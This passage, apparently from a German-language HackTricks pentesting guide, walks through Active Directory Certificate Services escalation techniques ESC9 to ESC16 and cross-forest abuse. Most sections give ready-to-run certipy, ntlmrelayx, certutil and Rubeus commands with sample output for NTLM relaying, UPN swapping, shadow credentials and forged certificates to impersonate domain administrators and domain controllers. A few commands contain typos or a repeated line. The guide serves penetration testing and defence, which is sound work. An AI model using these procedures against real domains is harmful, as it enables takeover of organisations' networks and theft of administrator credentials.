Eine Technik wie [PetitPotam](https://github.com/ly4k/PetitPotam) kann dann eingesetzt werden, um Authentifizierung zu erzwingen. Bei Domain Controllern ist die Angabe von `-template DomainController` erforderlich.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Erklärung

Der neue Wert **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) für **`msPKI-Enrollment-Flag`**, bezeichnet als ESC9, verhindert die Einbettung der neuen `szOID_NTDS_CA_SECURITY_EXT` Sicherheits-Erweiterung in ein Zertifikat. Dieses Flag wird relevant, wenn `StrongCertificateBindingEnforcement` auf `1` gesetzt ist (Standardeinstellung), im Gegensatz zu einer Einstellung von `2`. Seine Relevanz steigt in Szenarien, in denen eine schwächere Zertifikat-Zuordnung für Kerberos oder Schannel ausgenutzt werden könnte (wie bei ESC10), da das Fehlen von ESC9 die Anforderungen nicht ändern würde.

Bedingungen, unter denen die Einstellung dieses Flags bedeutsam wird, sind unter anderem:

- `StrongCertificateBindingEnforcement` ist nicht auf `2` gesetzt (Standard ist `1`), oder `CertificateMappingMethods` enthält das `UPN`-Flag.
- Das Zertifikat ist im `msPKI-Enrollment-Flag` mit dem `CT_FLAG_NO_SECURITY_EXTENSION`-Flag markiert.
- Das Zertifikat gibt eine beliebige Client-Authentication-EKU an.
- Über irgendein Konto bestehen `GenericWrite`-Berechtigungen, um ein anderes Konto zu kompromittieren.

### Missbrauchsszenario

Angenommen, `John@corp.local` besitzt `GenericWrite`-Berechtigungen über `Jane@corp.local`, mit dem Ziel, `Administrator@corp.local` zu kompromittieren. Die `ESC9`-Zertifikatvorlage, für die sich `Jane@corp.local` anmelden darf, ist in ihrem `msPKI-Enrollment-Flag`-Feld mit dem `CT_FLAG_NO_SECURITY_EXTENSION`-Flag konfiguriert.

Zunächst wird Janes Hash mithilfe von Shadow Credentials erlangt, dank Johns `GenericWrite`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Anschließend wird der `userPrincipalName` von `Jane` auf `Administrator` geändert, wobei der Domain-Teil `@corp.local` absichtlich weggelassen wird:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Diese Änderung verletzt die Einschränkungen nicht, da `Administrator@corp.local` weiterhin eindeutig als `Administrator`'s `userPrincipalName` erhalten bleibt.

Anschließend wird die als verwundbar markierte `ESC9`-Zertifikatvorlage als `Jane` angefordert:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Es fällt auf, dass der `userPrincipalName` des Zertifikats `Administrator` widerspiegelt, ohne irgendeine “object SID”.

Der `userPrincipalName` von `Jane` wird dann auf ihren ursprünglichen Wert `Jane@corp.local` zurückgesetzt:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Ein Versuch, sich mit dem ausgestellten Zertifikat zu authentifizieren, liefert jetzt den NT hash von `Administrator@corp.local`. Der Befehl muss `-domain <domain>` enthalten, da im Zertifikat keine Domain angegeben ist:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### Erklärung

ESC10 bezieht sich auf zwei Registry-Schlüsselwerte auf dem Domain Controller:

- The default value for `CertificateMappingMethods` under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` is `0x18` (`0x8 | 0x10`), previously set to `0x1F`.
- The default setting for `StrongCertificateBindingEnforcement` under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` is `1`, previously `0`.

**Fall 1**

Wenn `StrongCertificateBindingEnforcement` auf `0` konfiguriert ist.

**Fall 2**

Wenn `CertificateMappingMethods` das `UPN`-Bit (`0x4`) enthält.

### Missbrauchsfall 1

Wenn `StrongCertificateBindingEnforcement` auf `0` gesetzt ist, kann ein Konto A mit `GenericWrite`-Berechtigungen ausgenutzt werden, um jedes Konto B zu kompromittieren.

Beispielsweise versucht ein Angreifer mit `GenericWrite`-Berechtigungen für `Jane@corp.local`, `Administrator@corp.local` zu kompromittieren. Das Vorgehen entspricht ESC9 und erlaubt die Nutzung beliebiger certificate templates.

Zunächst wird der Hash von `Jane` mithilfe von Shadow Credentials abgerufen, indem die `GenericWrite`-Berechtigung ausgenutzt wird.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Anschließend wird der `userPrincipalName` von `Jane` auf `Administrator` geändert, wobei absichtlich der Teil `@corp.local` weggelassen wird, um eine Constraint-Verletzung zu vermeiden.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Anschließend wird als `Jane` ein Zertifikat angefordert, das Client-Authentifizierung ermöglicht, unter Verwendung der Standard-`User`-Vorlage.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` wird dann auf den ursprünglichen Wert `Jane@corp.local` zurückgesetzt.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Die Authentifizierung mit dem erhaltenen Zertifikat liefert den NT-Hash von `Administrator@corp.local`; da im Zertifikat keine Domainangaben enthalten sind, muss die Domain im Befehl explizit angegeben werden.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Missbrauchsfall 2

Wenn `CertificateMappingMethods` das `UPN`-Bitflag (`0x4`) enthält, kann ein Konto A mit `GenericWrite`-Berechtigungen jedes Konto B kompromittieren, dem die `userPrincipalName`-Eigenschaft fehlt, einschließlich Maschinenkonten und des integrierten Domänenadministrators `Administrator`.

Hier ist das Ziel, `DC$@corp.local` zu kompromittieren, beginnend damit, den Hash von `Jane` mittels Shadow Credentials zu erhalten, unter Ausnutzung von `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
Der `userPrincipalName` von `Jane` wird dann auf `DC$@corp.local` gesetzt.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Ein Zertifikat für die Client-Authentifizierung wird als `Jane` mithilfe der Standardvorlage `User` angefordert.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Der `userPrincipalName` von `Jane` wird nach diesem Prozess auf den ursprünglichen Wert zurückgesetzt.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Zur Authentifizierung über Schannel wird Certipy’s `-ldap-shell`-Option genutzt; sie zeigt eine erfolgreiche Authentifizierung als `u:CORP\DC$` an.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Über die LDAP-Shell ermöglichen Befehle wie `set_rbcd` Resource-Based Constrained Delegation (RBCD)-Angriffe, die möglicherweise den Domain Controller kompromittieren.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Diese Schwachstelle betrifft auch jedes Benutzerkonto, dem ein `userPrincipalName` fehlt oder bei dem dieser nicht mit dem `sAMAccountName` übereinstimmt. Das Standardkonto `Administrator@corp.local` ist ein primäres Ziel, da es standardmäßig über erhöhte LDAP-Rechte verfügt und kein `userPrincipalName` besitzt.

## Relaying NTLM to ICPR - ESC11

### Erklärung

If CA Server Do not configured with `IF_ENFORCEENCRYPTICERTREQUEST`, it can be makes NTLM relay attacks without signing via RPC service. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Sie können `certipy` verwenden, um festzustellen, ob `Enforce Encryption for Requests` deaktiviert ist; certipy zeigt dann `ESC11`-Schwachstellen an.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Missbrauchsszenario

Es muss einen relay server einrichten:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Hinweis: Für Domain Controller müssen wir `-template` in DomainController angeben.

Oder Verwendung von [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell-Zugriff auf ADCS-CA mit YubiHSM - ESC12

### Erklärung

Administratoren können die Certificate Authority so einrichten, dass sie auf einem externen Gerät wie dem Yubico YubiHSM2 gespeichert wird.

Wenn ein USB-Gerät über einen USB-Port mit dem CA-Server verbunden ist, oder ein USB device server verwendet wird, falls der CA-Server eine virtuelle Maschine ist, wird ein Authentifizierungsschlüssel (manchmal als "password" bezeichnet) benötigt, damit der Key Storage Provider Schlüssel im YubiHSM erzeugen und verwenden kann.

Dieser Schlüssel/password wird in der Registry unter `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` im Klartext gespeichert.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Abuse Scenario

Wenn der private Schlüssel der CA auf einem physischen USB-Gerät gespeichert ist und Sie Shell-Zugriff erhalten, ist es möglich, den Schlüssel zu extrahieren.

Zuerst müssen Sie das CA-Zertifikat beschaffen (dies ist öffentlich) und dann:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Abschließend verwenden Sie den certutil `-sign` Befehl, um ein neues beliebiges Zertifikat mit dem CA-Zertifikat und dessen privatem Schlüssel zu fälschen.

## OID Group Link Abuse - ESC13

### Erklärung

Das Attribut `msPKI-Certificate-Policy` erlaubt, die Ausstellungspolicy zur Zertifikatvorlage hinzuzufügen. Die `msPKI-Enterprise-Oid`-Objekte, die für Ausgabe-Policies verantwortlich sind, können im Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) des PKI OID-Containers entdeckt werden. Eine Policy kann mit einer AD-Gruppe verknüpft werden, indem das Attribut `msDS-OIDToGroupLink` dieses Objekts verwendet wird, wodurch ein System einen Benutzer, der das Zertifikat vorlegt, so autorisieren kann, als wäre er Mitglied der Gruppe. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Mit anderen Worten: Wenn ein Benutzer die Berechtigung hat, ein Zertifikat zu beantragen und das Zertifikat mit einer OID-Gruppe verknüpft ist, kann der Benutzer die Privilegien dieser Gruppe übernehmen.

Verwenden Sie [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) um OIDToGroupLink zu finden:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Missbrauchsszenario

Finde eine Benutzerberechtigung, die der Benutzer mit `certipy find` oder `Certify.exe find /showAllPermissions` verwenden kann.

Wenn `John` die Berechtigung hat, das Template `VulnerableTemplate` zu enrollen, kann der Benutzer die Privilegien der Gruppe `VulnerableGroup` übernehmen.

Alles, was er tun muss, ist das Template anzugeben; er erhält ein Zertifikat mit OIDToGroupLink-Rechten.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Verwundbare Konfiguration der Zertifikatserneuerung - ESC14

### Erklärung

Die Beschreibung unter https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping ist außerordentlich ausführlich. Nachfolgend eine Übersetzung/Zitierung des Originaltexts.

ESC14 betrifft Schwachstellen, die aus "weak explicit certificate mapping" entstehen, hauptsächlich durch den Missbrauch oder unsichere Konfiguration des Attributes `altSecurityIdentities` an Active Directory-Benutzer- oder Computerkonten. Dieses mehrwertige Attribut erlaubt Administratoren, X.509-Zertifikate manuell mit einem AD-Konto für Authentifizierungszwecke zu verknüpfen. Wenn es gesetzt ist, können diese expliziten Zuordnungen die standardmäßige Zertifikat-Zuordnungslogik überschreiben, die normalerweise auf UPNs oder DNS-Namen im SAN des Zertifikats oder der in der `szOID_NTDS_CA_SECURITY_EXT` Sicherheits-Erweiterung eingebetteten SID basiert.

Eine "schwache" Zuordnung tritt auf, wenn der in `altSecurityIdentities` verwendete String zur Identifizierung eines Zertifikats zu breit, leicht erratbar ist, sich auf nicht eindeutige Zertifikatfelder stützt oder leicht fälschbare Zertifikat-Komponenten verwendet. Wenn ein Angreifer ein Zertifikat beschaffen oder erstellen kann, dessen Attribute mit einer derart schwach definierten expliziten Zuordnung für ein privilegiertes Konto übereinstimmen, kann er dieses Zertifikat verwenden, um sich als dieses Konto zu authentifizieren und es zu imitieren.

Beispiele für potenziell schwache `altSecurityIdentities`-Mapping-Strings sind:

- Mapping ausschließlich über einen allgemeinen Subject Common Name (CN): z. B. `X509:<S>CN=SomeUser`. Ein Angreifer könnte in der Lage sein, ein Zertifikat mit diesem CN aus einer weniger sicheren Quelle zu erhalten.
- Verwendung übermäßig generischer Issuer Distinguished Names (DNs) oder Subject DNs ohne weitere Qualifikation wie eine spezifische Seriennummer oder Subject Key Identifier: z. B. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Einsatz anderer vorhersagbarer Muster oder nicht-kriptografischer Identifikatoren, die ein Angreifer in einem Zertifikat, das er rechtmäßig erlangen oder (bei Kompromittierung einer CA oder einer verwundbaren Vorlage wie in ESC1) fälschen kann, erfüllen könnte.

Das `altSecurityIdentities`-Attribut unterstützt verschiedene Formate für die Zuordnung, wie z. B.:

- `X509:<I>IssuerDN<S>SubjectDN` (Zuordnung nach vollständigem Issuer- und Subject-DN)
- `X509:<SKI>SubjectKeyIdentifier` (Zuordnung über den Subject Key Identifier des Zertifikats)
- `X509:<SR>SerialNumberBackedByIssuerDN` (Zuordnung nach Seriennummer, implizit durch den Issuer DN qualifiziert) - dies ist kein Standardformat, üblicherweise ist es `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (Zuordnung durch einen RFC822-Namen, typischerweise eine E-Mail-Adresse aus dem SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (Zuordnung durch einen SHA1-Hash des rohen öffentlichen Schlüssels des Zertifikats - generell stark)

Die Sicherheit dieser Zuordnungen hängt stark von der Spezifität, Einzigartigkeit und kryptografischen Stärke der gewählten Zertifikatsidentifikatoren im Mapping-String ab. Selbst mit aktivierten starken Zertifikat-Bindungsmodi auf Domain Controllern (die hauptsächlich implizite Zuordnungen basierend auf SAN-UPNs/DNS und der SID-Erweiterung betreffen) kann ein schlecht konfigurierter `altSecurityIdentities`-Eintrag weiterhin einen direkten Weg zur Imitation bieten, wenn die Zuordnungslogik selbst fehlerhaft oder zu permissiv ist.

### Missbrauchsszenario

ESC14 zielt auf **explizite Zertifikatszuordnungen** in Active Directory (AD) ab, speziell auf das Attribut `altSecurityIdentities`. Wenn dieses Attribut gesetzt ist (durch Design oder Fehlkonfiguration), können Angreifer Konten imitieren, indem sie Zertifikate präsentieren, die der Zuordnung entsprechen.

#### Szenario A: Angreifer kann in `altSecurityIdentities` schreiben

**Voraussetzung**: Der Angreifer hat Schreibrechte auf das `altSecurityIdentities`-Attribut des Zielkontos oder die Berechtigung, es zu setzen, in Form einer der folgenden Berechtigungen auf dem Ziel-AD-Objekt:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Szenario B: Ziel hat schwaches Mapping via X509RFC822 (E-Mail)

- **Voraussetzung**: Das Ziel hat eine schwache X509RFC822-Zuordnung in `altSecurityIdentities`. Ein Angreifer kann das `mail`-Attribut des Opfers so setzen, dass es dem X509RFC822-Namen des Ziels entspricht, ein Zertifikat für das Opfer beantragen/enrollen und dieses Zertifikat verwenden, um sich als das Ziel zu authentifizieren.

#### Szenario C: Ziel hat X509IssuerSubject-Mapping

- **Voraussetzung**: Das Ziel hat eine schwache X509IssuerSubject-Explizitzuordnung in `altSecurityIdentities`. Der Angreifer kann das Attribut `cn` oder `dNSHostName` bei einem Opferprinzipal so setzen, dass es dem Subject der X509IssuerSubject-Zuordnung des Ziels entspricht. Danach kann der Angreifer ein Zertifikat für das Opfer enrollen und dieses Zertifikat verwenden, um sich als das Ziel zu authentifizieren.

#### Szenario D: Ziel hat X509SubjectOnly-Mapping

- **Voraussetzung**: Das Ziel hat eine schwache X509SubjectOnly-Explizitzuordnung in `altSecurityIdentities`. Der Angreifer kann das Attribut `cn` oder `dNSHostName` bei einem Opferprinzipal so setzen, dass es dem Subject der X509SubjectOnly-Zuordnung des Ziels entspricht. Danach kann der Angreifer ein Zertifikat für das Opfer enrollen und dieses Zertifikat verwenden, um sich als das Ziel zu authentifizieren.

### Konkrete Operationen
#### Szenario A

Fordere ein Zertifikat der Zertifikatvorlage `Machine` an.
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Zertifikat speichern und konvertieren
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Authentifizieren (mit dem Zertifikat)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Aufräumen (optional)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Für spezifischere Angriffsverfahren in verschiedenen Angriffsszenarien lesen Sie bitte Folgendes: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Erklärung

Die Beschreibung unter https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc ist bemerkenswert ausführlich. Nachfolgend ein Zitat des Originaltexts.

> Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### Ausnutzung

Das Folgende bezieht sich auf [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu), Klicken Sie, um detailliertere Anwendungsanweisungen zu sehen.

Certipy's `find` command kann helfen, V1-Templates zu identifizieren, die potenziell anfällig für ESC15 sind, falls die CA unpatched ist.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Szenario A: Direct Impersonation via Schannel

**Schritt 1: Fordere ein Zertifikat an und injiziere die Application Policy "Client Authentication" sowie die Ziel-UPN.** Angreifer `attacker@corp.local` zielt auf `administrator@corp.local` und verwendet die "WebServer" V1-Vorlage (die ein vom Enrollee bereitgestelltes Subject erlaubt).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Die verwundbare V1-Vorlage mit "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Fügt die OID `1.3.6.1.5.5.7.3.2` in die Application Policies-Erweiterung des CSR ein.
- `-upn 'administrator@corp.local'`: Setzt den UPN im SAN zur Identitätsübernahme.

**Schritt 2: Mit dem erhaltenen Zertifikat über Schannel (LDAPS) authentifizieren.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Szenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Schritt 1: Fordere ein Zertifikat von einer V1 template an (mit "Enrollee supplies subject"), indem du die Application Policy "Certificate Request Agent" injizierst.** Dieses Zertifikat ist für den Angreifer (`attacker@corp.local`), damit er Enrollment Agent wird. Hier wird kein UPN für die Identität des Angreifers angegeben, da das Ziel die Fähigkeit ist, als Enrollment Agent zu fungieren.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Fügt die OID `1.3.6.1.4.1.311.20.2.1` ein.

**Schritt 2: Verwende das "agent"-Zertifikat, um im Namen eines privilegierten Zielbenutzers ein Zertifikat anzufordern.** Dies ist ein ESC3-ähnlicher Schritt, bei dem das Zertifikat aus Schritt 1 als Agentenzertifikat verwendet wird.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Schritt 3: Authentifizieren Sie sich als privilegierter Benutzer mithilfe des "on-behalf-of" Zertifikats.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Sicherheitserweiterung auf CA deaktiviert (global)-ESC16

### Erklärung

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** bezieht sich auf das Szenario, in dem, wenn die Konfiguration von AD CS nicht erzwingt, dass die **szOID_NTDS_CA_SECURITY_EXT**-Erweiterung in allen Zertifikaten enthalten ist, ein Angreifer dies ausnutzen kann durch:

1. Anfordern eines Zertifikats **ohne SID binding**.

2. Verwendung dieses Zertifikats **zur Authentifizierung als beliebiges Konto**, z. B. zur Imitation eines hochprivilegierten Kontos (z. B. eines Domain Administrator).

Sie können sich auch auf diesen Artikel beziehen, um mehr über das detaillierte Prinzip zu erfahren: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Missbrauch

Das Folgende bezieht sich auf [diesen Link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Weitere detaillierte Verwendungsweisen finden Sie dort.

Um zu ermitteln, ob die Active Directory Certificate Services (AD CS)-Umgebung für **ESC16** verwundbar ist:
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Schritt 1: Ursprüngliche UPN des Opferkontos auslesen (optional - zur Wiederherstellung).
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Schritt 2: Aktualisiere den UPN des Opferkontos auf den `sAMAccountName` des Zieladministrators.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Schritt 3: (falls erforderlich) Beschaffen Sie Anmeldeinformationen für das "victim"-Konto (z. B. via Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Schritt 4: Fordere ein Zertifikat als Benutzer "victim" von _einer geeigneten Client-Authentifizierungs-Vorlage_ (z. B. "User") auf der ESC16-anfälligen CA an.** Da die CA gegenüber ESC16 anfällig ist, wird sie automatisch die SID-Sicherheits-Erweiterung aus dem ausgestellten Zertifikat entfernen, unabhängig von den spezifischen Einstellungen der Vorlage für diese Erweiterung. Setze die Umgebungsvariable für den Kerberos-Credential-Cache (Shell-Befehl):
```bash
export KRB5CCNAME=victim.ccache
```
Fordere dann das Zertifikat an:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Schritt 5: Setze die UPN des "victim"-Kontos zurück.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Schritt 6: Authentifiziere dich als Zieladministrator.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Kompromittierung von Forests durch Zertifikate (in Passivform erklärt)

### Bruch von Forest-Trusts durch kompromittierte CAs

Die Konfiguration für **cross-forest enrollment** wurde relativ einfach gestaltet. Das **root CA certificate** aus dem resource forest wird von Administratoren in die account forests veröffentlicht, und die **enterprise CA**-Zertifikate aus dem resource forest werden in die `NTAuthCertificates`- und AIA-Container in jedem account forest hinzugefügt. Zur Klarstellung: Durch diese Konfiguration wird der **CA im resource forest vollständige Kontrolle** über alle anderen Forests gewährt, für die sie PKI verwaltet. Wird diese CA von Angreifern kompromittiert, könnten Zertifikate für alle Benutzer in sowohl dem resource- als auch den account-forests von ihnen gefälscht werden, wodurch die Sicherheitsgrenze des Forests durchbrochen würde.

### Enrollment Privileges Granted to Foreign Principals

In Multi-Forest-Umgebungen ist Vorsicht geboten bei Enterprise CAs, die **certificate templates veröffentlichen**, die **Authenticated Users oder foreign principals** (Benutzer/Gruppen, die außerhalb des Forests liegen, dem die Enterprise CA angehört) **enrollment and edit rights**.\  
Bei Authentifizierung über einen Trust wird vom AD die **Authenticated Users SID** dem Token des Benutzers hinzugefügt. Wenn eine Domain also eine Enterprise CA mit einer Vorlage besitzt, die **Authenticated Users enrollment rights** erlaubt, könnte die Vorlage potenziell von einem Benutzer aus einem anderen Forest **enrolled** werden. Ebenso, wenn einer **foreign principal** durch eine Vorlage **explizit enrollment rights** gewährt werden, wird dadurch eine **cross-forest access-control relationship** geschaffen, die es einem Principal aus einem Forest ermöglicht, in eine Vorlage eines anderen Forests **enroll** zu können.

Beide Szenarien führen zu einer **Erweiterung der Angriffsfläche** von einem Forest zum anderen. Die Einstellungen der certificate template könnten von einem Angreifer ausgenutzt werden, um zusätzliche Privilegien in einer fremden Domain zu erlangen.


## Referenzen

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
